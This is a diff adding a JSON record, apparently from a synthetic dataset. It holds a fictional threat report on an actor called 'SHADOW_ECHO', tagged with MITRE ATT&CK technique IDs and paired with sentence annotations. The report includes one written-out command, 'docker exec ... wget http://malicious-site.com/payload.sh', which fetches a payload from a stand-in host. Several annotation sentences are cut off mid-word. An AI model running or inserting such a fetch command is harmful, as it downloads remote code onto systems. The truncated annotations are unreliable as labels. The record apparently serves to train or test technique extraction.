@@ -1,0 +1,113 @@
+{
+    "report_id": "report_628",
+    "generated_at": "20251222_170924",
+    "scenario_target_ids": [
+        "T1195",
+        "T1609",
+        "T1564.007",
+        "T1563",
+        "T1113",
+        "T1119",
+        "T1008",
+        "T1011.001",
+        "T1048.003",
+        "T1531",
+        "T1498.002"
+    ],
+    "scenario_flow": [
+        "initial-access",
+        "execution",
+        "defense-evasion",
+        "lateral-movement",
+        "collection",
+        "collection",
+        "command-and-control",
+        "exfiltration",
+        "exfiltration",
+        "impact",
+        "impact"
+    ],
+    "llm_declared_ids": [
+        "T1195",
+        "T1564.007",
+        "T1119",
+        "T1563",
+        "T1609",
+        "T1113",
+        "T1008",
+        "T1048.003",
+        "T1011.001",
+        "T1531",
+        "T1498.002"
+    ],
+    "actual_found_ids": [
+        "T1011.001",
+        "T1008",
+        "T1564.007",
+        "T1113",
+        "T1498.002",
+        "T1195",
+        "T1563",
+        "T1048.003",
+        "T1119",
+        "T1609",
+        "T1531"
+    ],
+    "clean_text": "SHADOW_ECHO likely conducted initial reconnaissance on third-party software vendors before compromising a widely used library, malicious_dependency.dll, to establish a foothold via supply chain compromise. Upon execution, the malware utilized VBA stomping to bypass macro security by executing p-code from document metadata, while simultaneously initiating automated collection by looping through /proc/ entries every 2 seconds to read target application memory. The actors then moved laterally by hijacking remote service sessions to access a domain controller, where they employed container administration commands via 'docker exec malicious_container wget http://malicious-site.com/payload.sh' to download additional tools. During persistence, screen capture was triggered based on specific keywords in window titles, and the malware established fallback channels to switch to backup C2 servers if primary ones failed. For exfiltration, data was obfuscated with base64 encoding and sent over unencrypted non-C2 protocols, while stolen credentials were transferred via Bluetooth pairing protocol weaknesses. In the final stage, the campaign executed account access removal by disabling local administrator accounts with PowerShell commands, and launched a DDoS attack using reflection amplification by exploiting NTP servers with monlist enabled to overwhelm victim internet connections. Logs from affected systems showed increased network traffic and unusual process activity, but no actual data loss occurred in this training scenario.",
+    "tagged_text": "SHADOW_ECHO likely conducted initial reconnaissance on third-party software vendors before compromising a widely used library, malicious_dependency.dll, to establish a foothold via supply chain compromise [T1195]. Upon execution, the malware utilized VBA stomping [T1564.007] to bypass macro security by executing p-code from document metadata, while simultaneously initiating automated collection [T1119] by looping through /proc/ entries every 2 seconds to read target application memory. The actors then moved laterally by hijacking remote service sessions [T1563] to access a domain controller, where they employed container administration commands [T1609] via 'docker exec malicious_container wget http://malicious-site.com/payload.sh' to download additional tools. During persistence, screen capture [T1113] was triggered based on specific keywords in window titles, and the malware established fallback channels [T1008] to switch to backup C2 servers if primary ones failed. For exfiltration, data was obfuscated with base64 encoding and sent over unencrypted non-C2 protocols [T1048.003], while stolen credentials were transferred via Bluetooth pairing protocol weaknesses [T1011.001]. In the final stage, the campaign executed account access removal [T1531] by disabling local administrator accounts with PowerShell commands, and launched a DDoS attack using reflection amplification [T1498.002] by exploiting NTP servers with monlist enabled to overwhelm victim internet connections. Logs from affected systems showed increased network traffic and unusual process activity, but no actual data loss occurred in this training scenario.",
+    "sentence_annotations": [
+        {
+            "sentence": "dll, to establish a foothold via supply chain compromise.",
+            "technique_id": "T1195",
+            "technique_name": "Supply Chain Compromise"
+        },
+        {
+            "sentence": "007] to bypass macro security by executing p-code from document metadata, while simultaneously initiating automated collection by looping through /proc/ entries every 2 seconds to read target application memory.",
+            "technique_id": "T1119",
+            "technique_name": "Automated Collection"
+        },
+        {
+            "sentence": "The actors then moved laterally by hijacking remote service sessions to access a domain controller, where they employed container administration commands via 'docker exec malicious_container wget http://malicious-site.",
+            "technique_id": "T1563",
+            "technique_name": "Remote Service Session Hijacking"
+        },
+        {
+            "sentence": "The actors then moved laterally by hijacking remote service sessions to access a domain controller, where they employed container administration commands via 'docker exec malicious_container wget http://malicious-site.",
+            "technique_id": "T1609",
+            "technique_name": "Container Administration Command"
+        },
+        {
+            "sentence": "During persistence, screen capture was triggered based on specific keywords in window titles, and the malware established fallback channels to switch to backup C2 servers if primary ones failed.",
+            "technique_id": "T1113",
+            "technique_name": "Screen Capture"
+        },
+        {
+            "sentence": "During persistence, screen capture was triggered based on specific keywords in window titles, and the malware established fallback channels to switch to backup C2 servers if primary ones failed.",
+            "technique_id": "T1008",
+            "technique_name": "Fallback Channels"
+        },
+        {
+            "sentence": "In the final stage, the campaign executed account access removal by disabling local administrator accounts with PowerShell commands, and launched a DDoS attack using reflection amplification [T1498.",
+            "technique_id": "T1531",
+            "technique_name": "Account Access Removal"
+        }
+    ],
+    "llm_raw_response": {
+        "title": "Joint Cybersecurity Advisory: Fictional APT Campaign Targeting Critical Infrastructure",
+        "summary": "This advisory details a simulated campaign by a fictional threat actor group, designated as 'SHADOW_ECHO', targeting organizations in the energy sector. The campaign involves supply chain compromise, lateral movement via container administration, and data exfiltration using multiple protocols, culminating in denial-of-service attacks and account disruption.",
+        "full_report_text": "SHADOW_ECHO likely conducted initial reconnaissance on third-party software vendors before compromising a widely used library, malicious_dependency.dll, to establish a foothold via supply chain compromise [T1195]. Upon execution, the malware utilized VBA stomping [T1564.007] to bypass macro security by executing p-code from document metadata, while simultaneously initiating automated collection [T1119] by looping through /proc/ entries every 2 seconds to read target application memory. The actors then moved laterally by hijacking remote service sessions [T1563] to access a domain controller, where they employed container administration commands [T1609] via 'docker exec malicious_container wget http://malicious-site.com/payload.sh' to download additional tools. During persistence, screen capture [T1113] was triggered based on specific keywords in window titles, and the malware established fallback channels [T1008] to switch to backup C2 servers if primary ones failed. For exfiltration, data was obfuscated with base64 encoding and sent over unencrypted non-C2 protocols [T1048.003], while stolen credentials were transferred via Bluetooth pairing protocol weaknesses [T1011.001]. In the final stage, the campaign executed account access removal [T1531] by disabling local administrator accounts with PowerShell commands, and launched a DDoS attack using reflection amplification [T1498.002] by exploiting NTP servers with monlist enabled to overwhelm victim internet connections. Logs from affected systems showed increased network traffic and unusual process activity, but no actual data loss occurred in this training scenario.",
+        "techniques_used": [
+            "T1195",
+            "T1564.007",
+            "T1119",
+            "T1563",
+            "T1609",
+            "T1113",
+            "T1008",
+            "T1048.003",
+            "T1011.001",
+            "T1531",
+            "T1498.002"
+        ]
+    }
+}
